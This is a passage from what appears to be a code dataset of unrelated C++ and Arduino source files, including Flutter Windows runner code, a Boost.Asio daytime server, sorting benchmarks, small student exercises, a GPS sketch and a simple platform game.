!= nullptr) {\r\n            return this->_name;\r\n        } else {\r\n            return \"NAN\";\r\n        }\r\n    }\r\n\r\n    vector<Person*> returnChildren(){ //NOTE: SINCE CAN BE nullptr, CANNOT JUST USE this->_children\r\n        if (this != nullptr) {\r\n            return this->_children;\r\n        } else {\r\n            return {};\r\n        }\r\n    }\r\n\r\n    Person* getChild(string name){ //BFS same as isChild, just return object instead of bool\r\n        for (Person* p : this->returnChildren()){\r\n            if (p->returnName() == name)\r\n                return p;\r\n        }\r\n        return nullptr;\r\n    }\r\n\r\n    // Person* getNthChild(string name){ //BFS or DFS to see if a person if part of the parent's lineage\r\n    //     while (this->returnChildren() != {}){\r\n\r\n    //     }\r\n    //     return nullptr;\r\n    // }\r\n\r\n    // Person* getParent(Person* head){ //get Parent of specific entity. Need to start from head since it's single linked list\r\n    //     if (this == head) //cannot be parent if you are yourself the root. If you're not the root then you must be someone's child\r\n    //         return nullptr;\r\n\r\n    //     Person* p = head;\r\n    //     while (p->returnChildren()!={})\r\n    //     {\r\n    //         if(p->isChild(this->returnName())) //if i am the child of the current entity, then this entity is my parent\r\n    //             return p;\r\n    //     }\r\n    // }\r\n    #pragma endregion\r\n\r\n    #pragma region checkers\r\n    bool isChild(string name){ //O(n). BFS :) same as getChild, just return bool instead of object\r\n        for (Person* p : this->returnChildren()){\r\n            if (p->returnName() == name)\r\n                return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    bool isGrandChild(string name){//use isChild. DFS, O(n^2)\r\n        for (Person* p : this->returnChildren()){ //for every child of this entity\r\n            if (p->isChild(name)) //check if input is a child of the child iterated\r\n                return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    // bool isNthChild(string name, int n){ //DFS recursion of isChild\r\n    //     return false;\r\n    // } \r\n    #pragma endregion\r\n};\r\n\r\n#pragma region global functions\r\n//no need for it to be in Class (part of object) since no private var access needed. If in Class, it would be in the same format as PrintChildren\r\nvoid PrintTree(Person* head){ //BFS, should use PrintChildren\r\n    cout<<head->returnName()<<\": \";\r\n    // Person *p = head;\r\n    // While p.children is not empty{\r\n    //     cout<<p->name<<\", \";\r\n    // }\r\n    cout<<\"\\n\";\r\n}\r\n\r\nPerson* getPerson(Person* head, string name){ //BFS or DFS to see if a person is part of tree\r\n        if (head->returnName() ==name)\r\n            return head;\r\n\r\n        // while (this->returnChildren() != {}){\r\n\r\n        // }\r\n        return nullptr;\r\n    }\r\n\r\nbool Exists(Person *head, string name){\r\n    if (getPerson(head, name) ==nullptr)\r\n        return false;\r\n    return true;\r\n}\r\n#pragma endregion\r\n\r\nint main(){\r\n    //creating family tree ahmad->ali->edy\r\n ",
    "#include \"win32_window.h\"\r\n\r\n#include <dwmapi.h>\r\n#include <flutter_windows.h>\r\n\r\n#include \"resource.h\"\r\n\r\nnamespace {\r\n\r\n/// Window attribute that enables dark mode window decorations.\r\n///\r\n/// Redefined in case the developer's machine has a Windows SDK older than\r\n/// version 10.0.22000.0.\r\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\r\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\r\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\r\n#endif\r\n\r\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\r\n\r\n/// Registry key for app theme preference.\r\n///\r\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\r\n/// value indicates apps should use light mode.\r\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\r\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\r\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\r\n\r\n// The number of Win32Window objects that currently exist.\r\nstatic int g_active_window_count = 0;\r\n\r\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\r\n\r\n// Scale helper to convert logical scaler values to physical using passed in\r\n// scale factor\r\nint Scale(int source, double scale_factor) {\r\n  return static_cast<int>(source * scale_factor);\r\n}\r\n\r\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\r\n// This API is only needed for PerMonitor V1 awareness mode.\r\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\r\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\r\n  if (!user32_module) {\r\n    return;\r\n  }\r\n  auto enable_non_client_dpi_scaling =\r\n      reinterpret_cast<EnableNonClientDpiScaling*>(\r\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\r\n  if (enable_non_client_dpi_scaling != nullptr) {\r\n    enable_non_client_dpi_scaling(hwnd);\r\n  }\r\n  FreeLibrary(user32_module);\r\n}\r\n\r\n}  // namespace\r\n\r\n// Manages the Win32Window's window class registration.\r\nclass WindowClassRegistrar {\r\n public:\r\n  ~WindowClassRegistrar() = default;\r\n\r\n  // Returns the singleton registrar instance.\r\n  static WindowClassRegistrar* GetInstance() {\r\n    if (!instance_) {\r\n      instance_ = new WindowClassRegistrar();\r\n    }\r\n    return instance_;\r\n  }\r\n\r\n  // Returns the name of the window class, registering the class if it hasn't\r\n  // previously been registered.\r\n  const wchar_t* GetWindowClass();\r\n\r\n  // Unregisters the window class. Should only be called if there are no\r\n  // instances of the window.\r\n  void UnregisterWindowClass();\r\n\r\n private:\r\n  WindowClassRegistrar() = default;\r\n\r\n  static WindowClassRegistrar* instance_;\r\n\r\n  bool class_registered_ = false;\r\n};\r\n\r\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\r\n\r\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\r\n  if (!class_registered_) {\r\n    WNDCLASS window_class{};\r\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\r\n    window_class.lpszClassName = kWindowClassName;\r\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\r\n    window_class.cbClsExtra = 0;\r\n    window_class.cbWndExtra = 0;\r\n    window_class.hInstance = GetModuleHandle(nullptr);\r\n    window_class.hIcon =\r\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\r\n    window_class.hbrBackground = 0;\r\n    window_class.lpszMenuName = nullptr;\r\n    window_class.lpfnWndProc = Win32Window::WndProc;\r\n    RegisterClass(&window_class);\r\n    class_registered_ = true;\r\n  }\r\n  return kWindowClassName;\r\n}\r\n\r\nvoid WindowClassRegistrar::UnregisterWindowClass() {\r\n  UnregisterClass(kWindowClassName, nullptr);\r\n  class_registered_ = false;\r\n}\r\n\r\nWin32Window::Win32Window() {\r\n  ++g_active_window_count;\r\n}\r\n\r\nWin32Window::~Win32Window() {\r\n  --g_active_window_count;\r\n  Destroy();\r\n}\r\n\r\nbool Win32Window::Create(const std::wstring& title,\r\n                         const Point& origin,\r\n                         const Size& size) {\r\n  Destroy();\r\n\r\n  const wchar_t* window_class =\r\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\r\n\r\n  const POINT target_point = {static_cast<LONG>(origin.x),\r\n                              static_cast<LONG>(origin.y)};\r\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\r\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\r\n  double scale_factor = dpi / 96.0;\r\n\r\n  HWND window = CreateWindow(\r\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\r\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\r\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\r\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\r\n\r\n  if (!window) {\r\n    return false;\r\n  }\r\n\r\n  UpdateTheme(window);\r\n\r\n  return OnCreate();\r\n}\r\n\r\nbool Win32Window::Show() {\r\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\r\n}\r\n\r\n// static\r\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\r\n                                      UINT const message,\r\n                                      WPARAM const wparam,\r\n              ",
    "#include <ctime>\n#include <functional>\n#include <iostream>\n#include <memory>\n#include <string>\n#include <boost/asio.hpp>\n\nusing boost::asio::ip::tcp;\n\nstd::string make_daytime_string()\n{\n    using namespace std; // For time_t, time and ctime;\n    time_t now = time(0);\n    return ctime(&now);\n}\n\nclass tcp_connection\n    : public std::enable_shared_from_this<tcp_connection>\n{\npublic:\n    typedef std::shared_ptr<tcp_connection> pointer;\n\n    static pointer create(boost::asio::io_context &io_context)\n    {\n        return pointer(new tcp_connection(io_context));\n    }\n\n    tcp::socket &socket()\n    {\n        return socket_;\n    }\n\n    void start()\n    {\n        message_ = make_daytime_string();\n\n        boost::asio::async_write(socket_, boost::asio::buffer(message_),\n                                 std::bind(&tcp_connection::handle_write, shared_from_this(),\n                                           boost::asio::placeholders::error,\n                                           boost::asio::placeholders::bytes_transferred));\n    }\n\nprivate:\n    tcp_connection(boost::asio::io_context &io_context)\n        : socket_(io_context)\n    {\n    }\n\n    void handle_write(const boost::system::error_code & /*error*/,\n                      size_t /*bytes_transferred*/)\n    {\n    }\n\n    tcp::socket socket_;\n    std::string message_;\n};\n\nclass tcp_server\n{\npublic:\n    tcp_server(boost::asio::io_context &io_context)\n        : io_context_(io_context),\n          acceptor_(io_context, tcp::endpoint(tcp::v4(), 13))\n    {\n        start_accept();\n    }\n\nprivate:\n    void start_accept()\n    {\n        tcp_connection::pointer new_connection =\n            tcp_connection::create(io_context_);\n\n        acceptor_.async_accept(new_connection->socket(),\n                               std::bind(&tcp_server::handle_accept, this, new_connection,\n                                         boost::asio::placeholders::error));\n    }\n\n    void handle_accept(tcp_connection::pointer new_connection,\n                       const boost::system::error_code &error)\n    {\n        if (!error)\n        {\n            new_connection->start();\n        }\n\n        start_accept();\n    }\n\n    boost::asio::io_context &io_context_;\n    tcp::acceptor acceptor_;\n};\n\nint main()\n{\n    try\n    {\n        boost::asio::io_context io_context;\n        tcp_server server(io_context);\n        io_context.run();\n    }\n    catch (std::exception &e)\n    {\n        std::cerr << e.what() << std::endl;\n    }\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"episcan\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <vector>\n#include <algorithm>\nusing std::cout;\nusing std::endl;\nusing std::swap;\nusing std::sort;\n\nusing std::clock_t;\nconst int CLOCKS_PER_MS = CLOCKS_PER_SEC/1000; // clock per milliseconds\n\nconst int NUMBERS_SIZE = 50000;\n\n// random number in range -> for test code\nint genRandInt(int low, int high) {\n   return low + rand() % (high - low + 1);\n}\n\n// fill arrays -> for test code\nvoid fillArrays(int arr1[], int arr2[],int arr3[]) {\n  for(int i = 0; i < NUMBERS_SIZE; ++i){\n    arr1[i] = genRandInt(0,NUMBERS_SIZE);\n    arr2[i] = arr1[i];\n    arr3[i] = arr1[i];\n  }\n}\n\n// helper for quicksorts\nint QPartition(int numbers[], int low, int high, int pivotIndex) {\n  int pivot = numbers[pivotIndex];\n  while (true) {  // continuously loops until fin is true\n    // until reaches element left of pivot that is greater than pivot value\n    while (numbers[low] < pivot) { ++low; }\n    // until reaches element right of pivot that is less than pivot value\n    while (pivot < numbers[high]) { --high; }\n    if (low >= high) break;  // checks if there are unsorted elements\n    // if continues, low index is still less than high index\n    swap(numbers[low], numbers[high]);\n    ++low;\n    --high;\n  }\n  return high;\n}\n\n// sorts given array in range using quicksort method, recursive\nvoid Quicksort_midpoint(int numbers[], int low, int high) {\n  if (low >= high) return;  // already sorted\n  int mid = (high - low) / 2 + low;\n  mid = QPartition(numbers, low, high, mid);  // call helper\n  Quicksort_midpoint(numbers, low, mid);  // left half recursive call\n  Quicksort_midpoint(numbers, mid + 1, high); // right half recursive call\n}\n\n// sort given array in range using quicksort method, but chooses pivot by\n// choosing middle value of low, middle, and high indexes, recursive\nvoid Quicksort_medianOfThree(int numbers[], int low, int high) {\n  if (low >= high) return;  // already sorted\n  int mid = (high - low) / 2 + low;\n  int pivot = mid;  // element at mid is pivot by default\n  // element at lowest index is middle value\n  if ((numbers[mid] < numbers[low] && numbers[low] < numbers[high]) ||\n      (numbers[high] < numbers[low] && numbers[low] < numbers[mid])) pivot = low;\n  // element at highest index is middle value\n  if ((numbers[mid] < numbers[high] && numbers[high] < numbers[low]) ||\n      (numbers[low] < numbers[high] && numbers[high] < numbers[mid])) pivot = high;\n  mid = QPartition(numbers, low, high, pivot);  // call helper\n  Quicksort_medianOfThree(numbers, low, mid); // left half recursive call\n  Quicksort_medianOfThree(numbers, mid + 1, high);  // right half recursive call\n}\n\n// sorts given array using insertion sort method\nvoid InsertionSort(int numbers[], int numbersSize) {\n  for (int i = 1; i < numbersSize; ++i) { // sorts every element in array\n    int j = i;\n    // shifts element left to correct spot\n    while (j > 0 && numbers[j] < numbers[j - 1]) {\n      swap(numbers[j], numbers[j - 1]);\n      --j;\n    }\n  }\n}\n\n// helper, returns true if sorted, else false\nstatic bool is_sorted(int numbers[], int numbersSize) {\n  if (numbersSize <= 0) return true;  // will be sorted if empty\n  int last = numbers[0];\n  for(int i=0; i < numbersSize; ++i) {  // checks all elements\n    int curr = numbers[i];\n    if (curr < last) return false;  // prev value is greater than curr -> not sorted properly\n    last = curr;\n  }\n  return true;\n}\n\n// put vector in array after randomizing in main\nstatic void copy_vector_into_array(const std::vector<int>& source, int array[]) {\n  for(int i=0;i<static_cast<int>(source.size()); ++i) { // iterate through vector\n    array[i] = source[i];\n  }\n}\n\nint main() {\n  std::vector<int> sample;\n  sample.reserve(NUMBERS_SIZE);\n  // randomize array\n  for(int i=0; i<NUMBERS_SIZE; ++i) {\n    sample.push_back(rand() % (NUMBERS_SIZE + 1));\n  }\n  \n  // run tests across different sizes\n  int test_sizes[4] = { 10, 100, 1000, 50000 };\n  int test_array[NUMBERS_SIZE];\n  for(int i=0; i<4; ++i) {  // loops for four different sizes\n    int size = test_sizes[i];\n    cout << endl;\n    cout << \"-------------------- size \" << size << \" --------------------\" << endl;\n\n    {\n      copy_vector_into_array(sample, test_array);\n      clock_t Start = clock();\n      Quicksort_midpoint(test_array, 0, size - 1);\n      clock_t End = clock();\n      int elapsedTime = (End - Start)/CLOCKS_PER_MS;\n      cout << elapsedTime << \" ms\" << endl;\n      cout << \"Quicksort midpoint is \" << ((is_sorted(test_array,size))?\"GOOD\":\"BAD\") << endl;\n    }\n    \n    // QUICKSORT MEDIAN OF THREE SORT\n    {\n      copy_vector_into_array(sample, test_array);\n      clock_t Start = clock();\n      Quicksort_medianOfThree(test_array, 0, size - 1);\n      clock_t End = clock();\n      int elapsedTime = (End - Start)/CLOCKS_PER_MS;\n      cout << elapsedTime << \" ms\" << endl;\n      cout << \"Quicksort median of three is \" << ((is_sorted(test_array,size))?\"GOOD\":\"BAD\") << endl;\n    }\n    \n    // INSERTION SORT\n    {\n      co",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <iomanip>\n#include <string>\n#include <limits>\n#include <cctype>\nusing namespace std;\n\ndouble calcMPG(double gallons, double miles);\n\nint main()\n{\n\tconst double MAX_GALS = 100;\n\tconst double MILES = 500;\n\tbool valid = true;\n\tdouble gallons = 0.0;\n\tdouble mpg = 0.0;\n\tstring carMake;\n\n\n\tcout << \"Enter the make of the car: \";\n\tgetline(cin, carMake);\n\n\tdo\n\t{\n\t\tcout << \"\\nEnter how many gallons of fuel were used: \";\n\t\tcin >> gallons;\n\n\t\tif (cin.fail() || gallons <= 0) // Check for invalid input in the form of characters or 0 or negative numbers\n\t\t{\n\t\t\tif (cin.fail())\n\t\t\t{\n\t\t\t\tcout << \"\\nPlease enter numbers and not characters.\\n\";\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"\\nInvalid input. Please enter a positive number.\\n\";\n\t\t\t}\n\t\t\tcin.clear(); // clear error flag\n\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n'); // ignore input in buffer until newline character\n\t\t\tvalid = false; // set flag to false to ensure do while loops again\n\t\t}\n\t\telse if (gallons > MAX_GALS)\n\t\t{\n\t\t\tcout << \"\\nThat seems like a very high amount. Are you sure? (y/n): \";\n\t\t\tchar confirm;\n\t\t\tcin >> confirm;\n\n\t\t\tif (tolower(confirm) == 'y')\n\t\t\t{\n\t\t\t\tvalid = true;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tvalid = false;\n\t\t\t\tcin.clear();\n\t\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n');\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tvalid = true; // set flag to true to exit loop\n\t\t}\n\t} while (!valid);\n\n\tmpg = calcMPG(gallons, MILES);\n\n\tcout << fixed << setprecision(2);\n\tcout << endl << \"During the 500 mile drive, the \" << carMake << \"'s fuel efficiency was \" << mpg << \" miles per gallon.\" << endl;\n\n\treturn 0;\n}\n\ndouble calcMPG(double gallons, double miles)\n{\n\treturn miles / gallons;\n}",
    "#include <iostream>\r\n#include <stack>\r\n#include <string>\r\nusing namespace std;\r\nint precedence(char op) {\r\n    if (op == '+' || op == '-')\r\n        return 1;\r\n    else if (op == '*' || op == '/')\r\n        return 2;\r\n    else\r\n        return -1;\r\n}\r\nstring infixToPostfix(string infix) {\r\n    stack<char> st; \r\n    string ans = \"\";\r\n\r\n    for (int i = 0; i < infix.length(); i++) {\r\n        char ch = infix[i];\r\n        if (isalnum(ch))\r\n            ans += ch;\r\n        else if (ch == '(')\r\n            st.push(ch);\r\n        else if (ch == ')') {\r\n            while (!st.empty() && st.top() != '(') {\r\n                ans += st.top();\r\n                st.pop();\r\n            }\r\n            st.pop();\r\n        }\r\n        else {\r\n            while (!st.empty() && precedence(st.top()) >= precedence(ch)) {\r\n                ans += st.top();\r\n                st.pop();\r\n            }\r\n            st.push(ch);\r\n        }\r\n    }\r\n    while (!st.empty()) {\r\n        ans += st.top();\r\n        st.pop();\r\n    }\r\n\r\n    return ans;\r\n}\r\n\r\nint main() {\r\n    string infix = \"a+b*(c+d)-e/f\";\r\n    cout << \"Infix: \" << infix << endl;\r\n    cout << \"Postfix: \" << infixToPostfix(infix) << endl;\r\n    return 0;\r\n}\r\n",
    "\r\n#include <TinyGPSPlus.h>\r\n#include <HardwareSerial.h>\r\n\r\nHardwareSerial SerialPort(1); // use UART1\r\n\r\nTinyGPSPlus gps;\r\n\r\n\r\nvoid displayInfo()\r\n{\r\n  Serial.print(F(\"Location: \")); \r\n  if (gps.location.isValid())\r\n  {\r\n    Serial.print(gps.location.lat(), 6);\r\n    Serial.print(F(\",\"));\r\n    Serial.print(gps.location.lng(), 6);\r\n  }\r\n  else\r\n  {\r\n    Serial.print(F(\"INVALID\"));\r\n  }\r\n\r\n  Serial.print(F(\"  Date/Time: \"));\r\n  if (gps.date.isValid())\r\n  {\r\n    Serial.print(gps.date.month());\r\n    Serial.print(F(\"/\"));\r\n    Serial.print(gps.date.day());\r\n    Serial.print(F(\"/\"));\r\n    Serial.print(gps.date.year());\r\n  }\r\n  else\r\n  {\r\n    Serial.print(F(\"INVALID\"));\r\n  }\r\n\r\n  Serial.print(F(\" \"));\r\n  if (gps.time.isValid())\r\n  {\r\n    if (gps.time.hour() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.hour());\r\n    Serial.print(F(\":\"));\r\n    if (gps.time.minute() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.minute());\r\n    Serial.print(F(\":\"));\r\n    if (gps.time.second() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.second());\r\n    Serial.print(F(\".\"));\r\n    if (gps.time.centisecond() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.centisecond());\r\n  }\r\n  else\r\n  {\r\n    Serial.print(F(\"INVALID\"));\r\n  }\r\n\r\n  Serial.println();\r\n}\r\n\r\nvoid setup()\r\n{\r\n  Serial.begin(115200);\r\n  SerialPort.begin(9600, SERIAL_8N1, 9, 10); \r\n\r\n  while(!Serial);\r\n    Serial.println(\"Initializing\");\r\n\r\n  \r\n  delay(5000);\r\n  Serial.println(\"Test\");\r\n\r\n  SerialPort.println(\"$PMTK314,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0*29<CR><LF>\");\r\n\r\n  SerialPort.println(\"$PMTK220,100*2F<CR><LF>\");\r\n  //SerialPort.println(\"$PMTK251,115200*1F<CR><LF>\");\r\n\r\n  //SerialPort.begin(9600, SERIAL_8N1, 9, 10); \r\n  \r\n}\r\n\r\nvoid loop()\r\n{\r\n  // This sketch displays information every time a new sentence is correctly encoded.\r\n  while (SerialPort.available() > 0)\r\n    Serial.print(char(SerialPort.read()));\r\n    /*gps.encode(SerialPort.read());\r\n\r\n    \r\n    Serial.print(\"LAT=\"); Serial.print(gps.location.lat(), 6);\r\n    Serial.print(\" \");\r\n    Serial.print(\"LNG=\"); Serial.println(gps.location.lng(), 6);\r\n    Serial.println(gps.time.value());\r\n    Serial.println(\"\");\r\n    delay(1000);*/\r\n    \r\n\r\n  /*if (millis() > 5000 && gps.charsProcessed() < 10)\r\n  {\r\n    Serial.println(F(\"No GPS detected: check wiring.\"));\r\n    while(true);\r\n  }*/\r\n}\r\n\r\n",
    "// Game Name: Cosmic Climb\r\n// Written by: Caden Leedy\r\n// Date: 12/06/2022\r\n//\r\n// Instructions: Try to climb as high as possible without falling by bouncing off the white platforms. Hover over the screen\r\n// with the mouse and move it left or right to move the ball. \r\n//\r\n\r\n#include \"graphics.h\"\r\n#include <iostream>\r\n#include <string>\r\n#include <random>\r\n#include <cmath>\r\n#include <stdio.h>\r\n#include <string>\r\n\r\n\r\nusing namespace std;\r\n\r\nconst int BACKGROUND_COLOR = BLUE;\r\nconst int TEXT_COLOR = WHITE;\r\nconst int ARRAYSIZE = 9;\r\nconst int INITVEL = -26;\r\n\r\nrandom_device myEngine;\r\nuniform_real_distribution<double> randomReal(0.0, 1.0);\r\n\r\n\r\n//enumerated types:\r\n\r\n//defines enumerated type for the different types of platforms\r\nenum PlatformType { STATIC, BROKEN, MOVING };\r\n\r\n//defines enumerated type for different scenarios of the ball landing on a platform\r\nenum Landed { LEFT, MIDDLE, RIGHT };\r\n\r\n//set gravity\r\nconst double GRAVITY = 1.00;\r\n\r\n//constant variables for starting position of ball for each new game\r\nconst double RESETX = 250;\r\nconst double RESETY = 750;\r\n\r\n\r\n//Structure definitions:\r\n\r\n//defines structure for the player which is the ball\r\nstruct Player {\r\n\t// Variables to keep track of position, previous position, and velocity\r\n\tdouble x, y, prevX, prevY, velX, velY, gravity = GRAVITY;\r\n\tint color;\r\n\tbool alive;\r\n\r\n\r\n\r\n\t//a \"constructor\" function\r\n\tPlayer(int c) {\r\n\t\tcolor = c;\r\n\t\talive = true;\r\n\r\n\t\t// Set Initial Position\r\n\t\tx = RESETX;\r\n\t\ty = RESETY;\r\n\r\n\t\t//set previous position to be current position\r\n\t\tprevX = x;\r\n\t\tprevY = y;\r\n\r\n\t\t// Set Initial Velocity\r\n\t\tvelX = 0;\r\n\t\tvelY = INITVEL;\r\n\t} // end Player() constructor function\r\n\r\n\tvoid move() {\r\n\r\n\t\t//set previous position equal to current position to keep track of old position\r\n\t\tprevX = x;\r\n\t\tprevY = y;\r\n\r\n\t\t//erase old position\r\n\t\tsetcolor(BLUE);\r\n\t\tsetfillstyle(SOLID_FILL, BLUE);\r\n\t\tfillellipse(prevX, prevY, 20, 20);\r\n\r\n\t\t//move ball and redraw it\r\n\t\tx += velX;\r\n\t\ty += velY;\r\n\r\n\t\t//if ball goes off one side of the screen, makes it re-enter on the other side\r\n\t\tif (x <= -15) {\r\n\t\t\tx = 515;\r\n\t\t}\r\n\t\telse if (x >= 515) {\r\n\t\t\tx = -15;\r\n\t\t}\r\n\r\n\r\n\t\tsetcolor(color);\r\n\t\tsetfillstyle(SOLID_FILL, color);\r\n\t\tfillellipse(x, y, 20, 20);\r\n\r\n\r\n\r\n\t\tvelY += gravity; //change the velocity  by the acceleration due to gravity\r\n\r\n\r\n\t\tvelX = (static_cast<double>((250 - mousex()) * (-1))) / 10;\r\n\r\n\t}\r\n};\r\n\r\n\r\n//defines structure for the platforms\r\nstruct Platform {\r\n\tdouble x, y, prevX, prevY, velX, velY;\r\n\tPlatformType type;\r\n\tbool alive;\r\n\tbool spring;\r\n\r\n\r\n\t//function to calculate distance from player center to top left corner of platform\r\n\t// input the player.x and player.y\r\n\tdouble Ldistance(double ballx, double bally) {\r\n\t\tdouble distance = sqrt(pow(ballx - (x - 40), 2) + pow(bally - (y), 2));\r\n\t\treturn distance;\r\n\t}\r\n\t//function to calculate distance from player center to top right corner of platform\r\n\t// input the ball.x and ball.y\r\n\tdouble Rdistance(double ballx, double bally) {\r\n\t\tdouble distance = sqrt(pow(ballx - (x + 40), 2) + pow(bally - (y), 2));\r\n\t\treturn distance;\r\n\t}\r\n\r\n\t//function that determines if the ball landed on the plaform, \r\n\t//and returns whether it hit the left rounded edge, somewhere in the middle, or the right rounded edge of the platform\r\n\t//input ball.x, ball.y, and ball.velY\r\n\tLanded landedOn(double ballx, double bally, double prevbally, double vely) {\r\n\t\tif (vely > 0) {\r\n\t\t\tif (((ballx - 15) <= (x + 40)) && ((ballx + 15) >= (x - 40)) && ((bally + 20) >= (y - 5)) && ((prevbally + 20) <= (y - 5))) {\r\n\t\t\t\t//if ((ballx <= (x + 40)) && (ballx >= (x - 40)) && ((bally) >= (y + 5)) && ((y-bally) <=25)) {\r\n\t\t\t\treturn MIDDLE;\r\n\t\t\t}\r\n\t\t\t/*else if ((Ldistance(ballx, bally) <= 25) && ballx < (x - 40)) {\r\n\t\t\t\treturn LEFT;\r\n\t\t\t}\r\n\t\t\telse if ((Rdistance(ballx, bally) <= 25) && ballx > (x + 40)) {\r\n\t\t\t\treturn RIGHT;\r\n\t\t\t}\r\n\t\t\t*/\r\n\t\t}\r\n\t}\r\n\r\n\tvoid move(bool moveY) {\r\n\t\t//erase old\r\n\t\tsetcolor(BLUE);\r\n\t\tsetfillstyle(SOLID_FILL, BLUE);\r\n\t\tbar(x - 40, y + 5, x + 40, y - 5);\r\n\t\tpieslice(x - 40, y, 90, 270, 5);\r\n\t\tpieslice(x + 40, y, 270, 90, 5);\r\n\r\n\t\tif (type == MOVING) {\r\n\t\t\tif (x >= 450 || x <= 50) {\r\n\t\t\t\tvelX *= -1;\r\n\t\t\t}\r\n\t\t\tx += velX;\r\n\t\t}\r\n\t\tif (moveY)\r\n\t\t\ty -= velY;\r\n\r\n\t\t//draw new\r\n\t\tsetcolor(WHITE);\r\n\t\tsetfillstyle(SOLID_FILL, WHITE);\r\n\t\tbar(x - 40, y + 5, x + 40, y - 5);\r\n\t\tpieslice(x - 40, 